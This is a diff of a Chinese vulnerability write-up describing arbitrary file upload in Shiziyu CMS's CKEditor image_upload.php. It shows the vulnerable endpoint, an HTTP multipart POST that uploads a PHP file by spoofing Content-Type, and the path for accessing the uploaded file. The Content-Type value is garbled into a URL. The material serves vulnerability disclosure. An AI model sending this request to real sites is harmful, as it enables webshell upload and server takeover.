@@ -1,8 +1,8 @@
-# 狮子鱼CMS image_upload.php 任意文件上传
+# 狮子鱼CMS image\_upload.php 任意文件上传
 
 ## 漏洞描述
 
-狮子鱼CMS使用CK编辑器，存在图片上传的绕过，造成 image_upload.php 任意文件上传
+狮子鱼CMS使用CK编辑器，存在图片上传的绕过，造成 image\_upload.php 任意文件上传
 
 ## 漏洞影响
 
@@ -20,9 +20,9 @@
 
 登录页面如下
 
-![](images/202202170928345.png)
+![](../.gitbook/assets/202202170929313.png)
 
-漏洞文件为 CK编辑器的 image_upload.php
+漏洞文件为 CK编辑器的 image\_upload.php
 
 ```php
 <?php
@@ -85,9 +85,9 @@ if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // 判断提交方式是否为POST
 ?>
 ```
 
-其中使用 **Content-Type:** [**http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif**](http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif)  即可绕过上传PHP文件
+其中使用 **Content-Type:** [**http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif**](http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif) 即可绕过上传PHP文件
 
-```plain
+```
 POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2
 Host: 
 Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
@@ -101,14 +101,12 @@ Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
 ------WebKitFormBoundary8UaANmWAgM4BqBSs—
 ```
 
-![](images/202202170928692.png)
-
-
+![](../.gitbook/assets/202202170928692.png)
 
 访问返回的文件路径
 
-```plain
+```
 /Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php
 ```
 
-![](images/202202170928744.png)
+![](../.gitbook/assets/202202170928744.png)
